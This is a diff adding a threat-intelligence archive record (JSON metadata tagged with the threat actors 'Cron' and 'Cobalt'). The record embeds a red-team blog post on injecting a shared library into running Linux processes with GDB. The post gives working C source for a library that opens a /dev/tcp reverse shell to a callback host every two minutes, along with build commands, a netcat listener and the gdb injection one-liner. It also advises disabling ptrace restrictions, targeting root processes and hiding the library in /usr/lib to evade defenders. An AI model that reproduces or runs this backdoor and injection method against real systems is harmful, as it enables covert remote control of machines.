@@ -1,0 +1,79 @@
+{
+    "id": "e7d9de6c-7a5d-42d1-84c0-19de9642b19e",
+    "created_at": "2023-01-12T15:08:53.52399Z",
+    "updated_at": "2025-03-27T02:09:07.993975Z",
+    "deleted_at": null,
+    "sha1_hash": "1f7487abb5b7f175e96b43fdd08d2d151e16bc4e",
+    "title": "Process Injection with GDB",
+    "authors": "",
+    "file_creation_date": "2021-03-08T01:12:28Z",
+    "file_modification_date": "2021-03-08T01:12:28Z",
+    "file_size": 120440,
+    "plain_text": "# Process Injection with GDB\n\n**[magisterquis.github.io/2018/03/11/process-injection-with-gdb.html](https://magisterquis.github.io/2018/03/11/process-injection-with-gdb.html)**\n\n[Inspired by excellent CobaltStrike training, I set out to work out an easy way to inject into](https://specterops.io/how-we-help/training-offerings/adversary-tactics-red-team-operations)\nprocesses in Linux. There’s been quite a lot of experimentation with this already, usually\n[using ptrace(2) or](https://github.com/gaffe23/linux-inject) `LD_PRELOAD, but I wanted something a little simpler and less error-`\nprone, perhaps trading ease-of-use for flexibility and works-everywhere. Enter GDB and\nshared object files (i.e. libraries).\n\nGDB, for those who’ve never found themselves with a bug unsolvable with lots of well-placed\n```\nprintf(\"Here\\n\") statements, is the GNU debugger. It’s typical use is to poke at a runnnig\n\n```\nprocess for debugging, but it has one interesting feature: it can have the debugged process\ncall library functions. There are two functions which we can use to load a library into to the\nprogram: `dlopen(3) from libdl, and` `__libc_dlopen_mode, libc’s implementation. We’ll`\nuse `__libc_dlopen_mode because it doesn’t require the host process to have libdl linked`\nin.\n\nIn principle, we could load our library and have GDB call one of its functions. Easier than\nthat is to have the library’s constructor function do whatever we would have done manually\nin another thread, to keep the amount of time the process is stopped to a minimum. More\nbelow.\n\n## Caveats\n\nTrading flexibility for ease-of-use puts a few restrictions on where and how we can inject our\nown code. In practice, this isn’t a problem, but there are a few gotchas to consider.\n```\nptrace(2)\n\n```\nWe’ll need to be able to attach to the process with `ptrace(2), which GDB uses under the`\nhood. Root can usually do this, but as a user, we can only attach to our own processes. To\nmake it harder, some systems only allow processes to attach to their children, which can be\n[changed via a sysctl. Changing the sysctl requires root, so it’s not very useful in practice. Just](https://www.kernel.org/doc/Documentation/security/Yama.txt)\nin case:\n```\nsysctl kernel.yama.ptrace_scope=0\n# or\necho 0 > /proc/sys/kernel/yama/ptrace_scope\n\n```\nGenerally, it’s better to do this as root.\n\n### Stopped Processes\n\n\n-----\n\nWhen GDB attaches to a process, the process is stopped. It s best to script GDB s actions\nbeforehand, either with `-x and` `--batch or` `echo ing commands to GDB minimize the`\namount of time the process isn’t doing whatever it should be doing. If, for whatever reason,\nGDB doesn’t restart the process when it exits, sending the process `SIGCONT should do the`\ntrick.\n```\nkill -CONT <PID>\n\n### Process Death\n\n```\nOnce our library’s loaded and running, anything that goes wrong with it (e.g. segfaults)\naffects the entire process. Likewise, if it writes output or sends messages to syslog, they’ll\nshow up as coming from the process. It’s not a bad idea to use the injected library as a loader\nto spawn actual malware in new proceses.\n\n## On Target\n\nWith all of that in mind, let’s look at how to do it. We’ll assume ssh access to a target, though\nin principle this can (should) all be scripted and can be run with shell/sql/file injection or\nwhatever other method.\n\n### Process Selection\n\nFirst step is to find a process into which to inject. Let’s look at a process listing, less kernel\nthreads:\n\n\n-----\n\n```\nroot@ubuntu s 1vcpu 1gb nyc1 01: # ps fxo pid,user,args | egrep v \\[\\S+\\]$ \n PID USER   COMMAND\n  1 root   /sbin/init\n 625 root   /lib/systemd/systemd-journald\n 664 root   /sbin/lvmetad -f\n 696 root   /lib/systemd/systemd-udevd\n 1266 root   /sbin/iscsid\n 1267 root   /sbin/iscsid\n 1273 root   /usr/lib/accountsservice/accounts-daemon\n 1278 root   /usr/sbin/sshd -D\n 1447 root   \\_ sshd: root@pts/1\n 1520 root     \\_ -bash\n 1538 root       \\_ ps -fxo pid,user,args\n 1539 root       \\_ grep -E --color=auto -v \\[\\S+\\]$\n 1282 root   /lib/systemd/systemd-logind\n 1295 root   /usr/bin/lxcfs /var/lib/lxcfs/\n 1298 root   /usr/sbin/acpid\n 1312 root   /usr/sbin/cron -f\n 1316 root   /usr/lib/snapd/snapd\n 1356 root   /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise -scan --syslog\n 1358 root   /usr/lib/policykit-1/polkitd --no-debug\n 1413 root   /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220\n 1415 root   /sbin/agetty --noclear tty1 linux\n 1449 root   /lib/systemd/systemd --user\n 1451 root   \\_ (sd-pam)\n\n```\nSome good choices in there. Ideally we’ll use a long-running process which nobody’s going to\nwant to kill. Processes with low pids tend to work nicely, as they’re started early and nobody\nwants to find out what happens when they die. It’s helpful to inject into something running\nas root to avoid having to worry about permissions. Even better is a process that nobody\nwants to kill but which isn’t doing anything useful anyway.\n\nIn some cases, something short-lived, killable, and running as a user is good if the injected\ncode only needs to run for a short time (e.g. something to survey the box, grab creds, and\nleave) or if there’s a good chance it’ll need to be stopped the hard way. It’s a judgement call.\n\nWe’ll use `664 root /sbin/lvmetad -f . It should be able to do anything we’d like and if`\nsomething goes wrong we can restart it, probably without too much fuss.\n\n### Malware\n\nMore or less any linux shared object file can be injected. We’ll make a small one for\ndemonstration purposes, but I’ve injected multi-megabyte backdoors written in Go as well. A\n[lot of the fiddling that went into making this blog post was done using pcapknock.](https://github.com/magisterquis/pcapknock)\n\nFor the sake of simplicity, we’ll use the following. Note that a lot of error handling has been\nelided for brevity. In practice, getting meaningful error output from injected libraries’\nconstructor functions isn’t as straightforward as a simple `warn(\"something\"); return;`\nunless you really trust the standard error of your victim process.\n\n\n-----\n\n```\n#include <pthread.h>\n#include <stdlib.h>\n#include <unistd.h>\n#define SLEEP 120          /* Time to sleep between callbacks */\n#define CBADDR \"<REDACTED>\"      /* Callback address */\n#define CBPORT \"4444\"         /* Callback port */\n/* Reverse shell command */\n#define CMD \"echo 'exec >&/dev/tcp/\"\\\n      CBADDR \"/\" CBPORT \"; exec 0>&1' | /bin/bash\"\nvoid *callback(void *a);\n__attribute__((constructor)) /* Run this function on library load */\nvoid start_callbacks(){\n    pthread_t tid;\n    pthread_attr_t attr;\n    /* Start thread detached */\n    if (-1 == pthread_attr_init(&attr)) {\n        return;\n    }\n    if (-1 == pthread_attr_setdetachstate(&attr,\n                PTHREAD_CREATE_DETACHED)) {\n        return;\n    }\n    /* Spawn a thread to do the real work */\n    pthread_create(&tid, &attr, callback, NULL);\n}\n/* callback tries to spawn a reverse shell every so often. */\nvoid *\ncallback(void *a)\n{\n    for (;;) {\n        /* Try to spawn a reverse shell */\n        system(CMD);\n        /* Wait until next shell */\n        sleep(SLEEP);\n    }\n    return NULL;\n}\n\n```\nIn a nutshell, this will spawn an unencrypted, unauthenticated reverse shell to a hardcoded\naddress and port every couple of minutes. The `__attribute__((constructor)) applied to`\n```\nstart_callbacks() causes it to run when the library is loaded. All start_callbacks()\n\n```\ndoes is spawn a thread to make reverse shells.\n\nBuilding a library is similar to building any C program, except that `-fPIC and` `-shared`\nmust be given to the compiler.\n\n\n-----\n\n```\ncc O2 fPIC o libcallback.so ./callback.c lpthread shared\n\n```\nIt’s not a bad idea to optimize the output with `-O2 to maybe consume less CPU time. Of`\ncourse, on a real engagement the injected library will be significantly more complex than this\nexample.\n\n### Injection\n\nNow that we have the injectable library created, we can do the deed. First thing to do is start\na listener to catch the callbacks:\n```\nnc -nvl 4444 #OpenBSD netcat ftw!\n__libc_dlopen_mode takes two arguments, the path to the library and flags as an integer.\n\n```\nThe path to the library will be visible, so it’s best to put it somewhere inconspicuous, like\n```\n/usr/lib . We’ll use 2 for the flags, which corresponds to dlopen(3) ’s RTLD_NOW. To get\n\n```\nGDB to cause the process to run the function, we’ll use GDB’s `print command, which`\nconviently gives us the function’s return value. Instead of typing the command into GDB,\nwhich takes eons in program time, we’ll echo it into GDB’s standard input. This has the nice\nside-effect of causing GDB to exit without needing a `quit command.`\n```\nroot@ubuntu-s-1vcpu-1gb-nyc1-01:~# echo 'print\n__libc_dlopen_mode(\"/root/libcallback.so\", 2)' | gdb -p 664\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\n...snip...\n0x00007f6ca1cf75d3 in select () at ../sysdeps/unix/syscall-template.S:84\n84   ../sysdeps/unix/syscall-template.S: No such file or directory.\n(gdb) [New Thread 0x7f6c9bfff700 (LWP 1590)]\n$1 = 312536496\n(gdb) quit\nA debugging session is active.\n    Inferior 1 [process 664] will be detached.\nQuit anyway? (y or n) [answered Y; input not from terminal]\nDetaching from program: /sbin/lvmetad, process 664\n\n```\nChecking netcat, we’ve caught the callback:\n```\n[stuart@c2server:/home/stuart]\n$ nc -nvl 4444\nConnection from <REDACTED> 50184 received!\nps -fxo pid,user,args\n...snip...\n 664 root   /sbin/lvmetad -f\n 1591 root   \\_ sh -c echo 'exec >&/dev/tcp/<REDACTED>/4444; exec 0>&1' |\n/bin/bash\n 1593 root     \\_ /bin/bash\n 1620 root       \\_ ps -fxo pid,user,args\n...snip...\n\n```\n\n-----\n\nThat s it, we ve got execution in another process.\n\nIf the injection had failed, we’d have seen `$1 = 0, indicating` `__libc_dlopen_mode`\nreturned `NULL .`\n\n## Artifacts\n\nThere are several places defenders might catch us. The risk of detection can be minimized to\na certain extent, but without a rootkit, there’s always some way to see we’ve done something.\nOf course, the best way to hide is to not raise suspicions in the first place.\n\n### Process listing\n\nA process listing like the one above will show that the process into which we’ve injected\nmalware has funny child processes. This can be avoided by either having the library doulefork a child process to do the actual work or having the injected library do everything from\nwithin the victim process.\n\n### Files on disk\n\nThe loaded library has to start on disk, which leaves disk artifacts, and the original path to\nthe library is visible in `/proc/pid/maps :`\n```\nroot@ubuntu-s-1vcpu-1gb-nyc1-01:~# cat /proc/664/maps                \n...snip...\n7f6ca0650000-7f6ca0651000 r-xp 00000000 fd:01 61077  /root/libcallback.so     \n7f6ca0651000-7f6ca0850000 ---p 00001000 fd:01 61077  /root/libcallback.so     \n7f6ca0850000-7f6ca0851000 r--p 00000000 fd:01 61077  /root/libcallback.so\n7f6ca0851000-7f6ca0852000 rw-p 00001000 fd:01 61077  /root/libcallback.so     \n...snip...\n\n```\nIf we delete the library, `(deleted) is appended to the filename (i.e.`\n```\n/root/libcallback.so (deleted) ), which looks even weirder. This is somewhat\n\n```\nmitigated by putting the library somewhere libraries normally live, like `/usr/lib, and`\nnaming it something normal-looking.\n\n### Service disruption\n\nLoading the library stops the running process for a short amount of time, and if the library\ncauses process instability, it may crash the process or at least cause it to log warning\n[messages (on a related note, don’t inject into systemd(1), it causes segfaults and makes](https://twitter.com/MagisterQuis/status/972601551893291008)\n```\nshutdown(8) hang the box).\n\n## TL;DR\n\n```\nProcess injection on Linux is reasonably easy:\n\n\n-----\n\n1. Write a library (shared object file) with a constructor.\n2. Load it with `echo 'print __libc_dlopen_mode(\"/path/to/library.so\", 2)' |`\n\n```\ngdb -p <PID>\n\n```\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Linux/Process Injection/Process Injection with GDB.pdf"
+    ],
+    "report_names": [
+        "Process Injection with GDB.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
+            "created_at": "2022-10-25T16:07:24.471018Z",
+            "updated_at": "2025-03-27T02:02:10.24394Z",
+            "deleted_at": null,
+            "main_name": "Cron",
+            "aliases": [],
+            "source_name": "ETDA:Cron",
+            "tools": [
+                "Catelites",
+                "Catelites Bot",
+                "CronBot",
+                "TinyZBot"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673536133,
+    "ts_updated_at": 1743041347,
+    "ts_creation_date": 1615165948,
+    "ts_modification_date": 1615165948,
+    "files": {
+        "pdf": "https://archive.orkl.eu/1f7487abb5b7f175e96b43fdd08d2d151e16bc4e.pdf",
+        "text": "https://archive.orkl.eu/1f7487abb5b7f175e96b43fdd08d2d151e16bc4e.txt",
+        "img": "https://archive.orkl.eu/1f7487abb5b7f175e96b43fdd08d2d151e16bc4e.jpg"
+    }
+}
